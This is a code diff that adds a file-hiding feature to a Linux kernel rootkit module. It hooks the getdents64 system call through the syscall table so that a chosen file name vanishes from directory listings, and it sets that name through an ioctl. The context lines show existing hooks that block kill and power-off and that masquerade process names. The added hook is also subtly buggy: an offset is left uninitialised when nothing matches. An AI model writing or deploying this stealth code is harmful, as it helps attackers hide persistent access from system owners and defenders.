@@ -35,6 +35,7 @@ static void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_ad
 
 static syscall_fn_t orig_reboot;
 static syscall_fn_t orig_kill;
+static syscall_fn_t orig_getdents64;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
@@ -124,6 +125,16 @@ static int masqProcNames(const struct masq_proc_req __user *req) {
     return 0;
 }
 
+struct hided_file hidden_file;
+
+static int hideFile(const struct hided_file __user *file)
+{
+    hidden_file.len = file->len;
+    if (copy_from_user(hidden_file.name, file->name, file->len + 1))
+        return -EFAULT;
+    return 0;
+}
+
 asmlinkage long reboot_hook(const struct pt_regs *regs)
 {
     if (regs->regs[2] == LINUX_REBOOT_CMD_POWER_OFF) {
@@ -138,6 +149,30 @@ asmlinkage long kill_hook(const struct pt_regs *regs)
         return -EPERM;
     }
     return orig_kill(regs);
+}
+
+asmlinkage long getdents64_hook(const struct pt_regs *regs)
+{
+    long nread = orig_getdents64(regs);
+    struct linux_dirent64 *buf = (struct linux_dirent64 *) regs->regs[1];
+    struct linux_dirent64 *dirent = NULL;
+    int pos;
+    unsigned short offset;
+
+    if (hidden_file.len == 0) return nread;
+
+    for (pos = 0; pos < nread; pos += dirent->d_reclen) {
+        dirent = (struct linux_dirent64 *) ((char *) buf + pos);
+
+        if (strcmp(dirent->d_name, hidden_file.name) != 0)
+            continue;
+
+        offset = dirent->d_reclen;
+        break;
+    }
+    memmove((char *) buf + pos, (char *) buf + pos + offset, nread - pos - offset);
+
+    return nread - offset;
 }
 
 static void updateSysCallTableAccess(bool writable)
@@ -155,6 +190,7 @@ static void unhookSysCalls(void)
 
     sc_table[__NR_reboot] = (unsigned long) orig_reboot;
     sc_table[__NR_kill] = (unsigned long) orig_kill;
+    sc_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 
     updateSysCallTableAccess(false);
     hooked = false;
@@ -168,9 +204,12 @@ static void hookSysCalls(void)
     sc_table[__NR_reboot] = (unsigned long) reboot_hook;
     orig_kill = (syscall_fn_t) sc_table[__NR_kill];
     sc_table[__NR_kill] = (unsigned long) kill_hook;
+    orig_getdents64 = (syscall_fn_t) sc_table[__NR_getdents64];
+    sc_table[__NR_getdents64] = (unsigned long) getdents64_hook;
 
     updateSysCallTableAccess(false);
     hooked = true;
+    hidden_file.len = 0;
 }
 
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
@@ -191,6 +230,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
         ret = masqProcNames((struct masq_proc_req __user *) arg);
         break;
     case IOCTL_FILE_HIDE:
+        ret = hideFile((struct hided_file __user *) arg);
         break;
     default:
         ret = -EINVAL;
